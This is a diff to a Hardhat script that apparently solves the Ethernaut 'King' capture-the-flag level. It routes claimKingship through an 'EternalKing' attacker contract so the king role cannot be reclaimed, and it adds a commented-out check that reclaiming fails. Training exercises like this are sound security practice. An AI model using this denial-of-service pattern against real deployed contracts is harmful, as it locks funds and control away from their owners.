@@ -1,8 +1,12 @@
 import { ethers } from "hardhat";
+import { expect } from "chai";
+import { Wallet } from "ethers";
 
 const attackVault = async () => {
     // change contract addresses here.
     const kingAddress = "0xe094498d7F6F2d4E3b829E3A52e2dd2745498e46"; //type "await contract.address()" in ethernaut console
+    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here
+    const eternalKingAddress = "";
 
     // Don't touch below 🚀
     // Vulnerability comes from the possibility of making a malicious contract the king
@@ -48,10 +52,26 @@ const attackVault = async () => {
     console.log(`Current King is: ${king}`);
     console.log(`Current Prize is: ${prize}`);
     console.log("Making EternalKing Contract as the new king...");
-    const tx1 = await contract.claimKingship(kingAddress, { value: prize });
+    const tx1 = await attack.claimKingship(kingAddress, { value: prize });
     const tx1Receipt = await tx1.wait();
     console.log(tx1Receipt);
     //TODO: check king can't be reclaimed
+    // const provider = await ethers.getDefaultProvider("goerli");
+    // /*Private Keys in .env file or hardcode here*/
+    // const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
+    // const wallet = new Wallet(PRIVATE_KEY, provider);
+    // const fail = await expect(
+    //     wallet.sendTransaction({
+    //         from: player,
+    //         value: prize,
+    //     })
+    // ).to.be.reverted;
+    // console.log(`Transaction Failed?: ${fail}`);
+    // if (fail) {
+    //     console.log("Done, Submit to ethernaut.");
+    // } else {
+    //     console.log("Review code and try again...");
+    // }
     console.log("Done, Submit to ethernaut.");
 };
 
